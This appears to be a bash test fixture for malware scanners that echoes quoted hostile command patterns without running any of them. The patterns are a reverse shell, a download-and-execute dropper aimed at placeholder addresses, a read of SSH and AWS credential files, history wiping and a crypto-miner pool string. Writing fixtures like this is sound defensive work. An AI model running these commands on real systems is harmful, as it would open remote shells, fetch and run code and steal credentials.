#!/bin/bash
# INERT detector-test fixture (like EICAR for scanners). Runs nothing; all payloads are quoted.
w="hidden"
echo "pattern: bash -i >& /dev/tcp/192.0.2.13/4444 0>&1"       # reverse-shell string, quoted
echo "pattern: curl http://192.0.2.50/a -o /tmp/a && chmod +x /tmp/a"   # dropper string, quoted
echo "pattern: nohup /tmp/a &"                                  # background exec, quoted
echo "pattern: cat ~/.ssh/id_rsa ~/.aws/credentials"           # cred-access string, quoted
echo "pattern: history -c; unset HISTFILE"                     # anti-forensics string, quoted
echo "pattern: stratum+tcp://192.0.2.9:3333 xmrig"             # miner string, quoted
: 'the following decodes to a harmless echo and is never eval-d'
PAYLOAD="ZWNobyAiaW5lcnQgZGV0ZWN0b3IgdGVzdCBmaXh0dXJlIg=="
echo "$PAYLOAD" | base64 --decode >/dev/null   # decode to null, never executed
echo "fixture complete"
